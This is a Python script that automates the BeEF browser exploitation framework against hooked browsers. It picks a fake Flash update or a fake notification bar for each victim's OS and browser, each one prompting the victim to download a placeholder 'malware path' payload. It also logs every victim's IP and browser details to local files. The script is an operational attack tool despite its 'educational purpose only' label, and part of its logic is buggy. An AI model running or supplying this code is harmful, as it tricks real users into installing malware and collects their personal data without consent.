#!/usr/bin/env python

# This is a free program made for educational purpose only. 


from beefapi import BeefAPI
import unicodedata, os, time


def pentest():
	
	print "\n\n\n====================="
	print "program started fully"
	print "====================="
	
	beef = BeefAPI({})

	beef.login('beef', 'beef') # Your beef credentials.

	notify_module = 0	# to store firefox module id
	flash_module = 0	# to store chrome module id

	
	# Replace this with your favorite modules
	
	notify_module = beef.modules.findbyname('Fake Notification Bar')
			
	flash_module = beef.modules.findbyname('Fake Flash Update')

	found = 0
	
	while True:
		if len(beef.hooked_browsers.online) > 0:
			log = open("log.txt", "a+") 		# To keep a log of victims detail information.
			ip_log = open("ip_log", "a+")		# To keep a list of ip addresses who already accessed our url so the msg will not be repeated to same victim.
			
			for hook in beef.hooked_browsers.online:
				
				if os.stat("ip_log").st_size != 0:
					for ip in ip_log:
						if unicode(ip[:-1], "utf-8") == hook.details[u'IP']:
							found = 1
							break
							
				if found == 1:
					found == 0
					continue
							
							
			
			# We will use 'Fake Flash Update' module here.
				
				# example of Windows with chrome browser.
				if hook.details[u'BrowserName'] == u'C' and hook.details[u'OsName'] == u'Windows':
					print hook.run(flash_module.id, options={u'image': u'http://"your Ip here":3000/demos/chrome_msg.png', \
															u'payload':u'Custom_Payload', \
															u'payload_uri': 'http://Put your malware path here'})
				# example linux with firefox browser.		
				elif hook.details[u'BrowserName'] == u'FF' and hook.details[u'OsName'] == u'Linux':
					print hook.run(flash_module.id, options={u'url': u'http://"your Ip here":3000/demos/ff_msg.png', \
													u'payload':u'Custom_Payload', \
													u'payload_uri': 'http://Put your malware path here'})
													
				# example for android OS only. You can use other OS as well.
				elif hook.details[u'OsName'] == u'Android':
					print hook.run(flash_module.id, options={u'url': u'http://"your Ip here":3000/demos/andy.png', \
													u'payload':u'Custom_Payload', \
													u'payload_uri': 'http://Put your malware path here'})
													
			# For the rest of the browsers We'll use 'Fake Notification Bar' module.
				else:
					print hook.run(flash_module.id, options={u'url': u'http://Put your malware path here', \
												u'notification_text': u'User is recommended to install this plugin for safe browsing'})  # you can give any msg here.
											
				
				
				ip_log.write(unicodedata.normalize('NFKD', hook.details[u'IP']).encode('ascii','ignore')+'\n')
				
				for key, val in hook.details.items():
					
					key = unicodedata.normalize('NFKD', key).encode('ascii','ignore')
					
					#sometimes beef couldn't gather all details info about victim, whatever the reasons are...
					# So we'll only write available infos in our file
					
					if val != None:							
						val = unicodedata.normalize('NFKD', val).encode('ascii','ignore')
						log.write(key+" : "+val+'\n')
						
				log.write("="*100+'\n')
				
			log.close()
			ip_log.close()
				


if __name__ == "__main__":
	pentest()
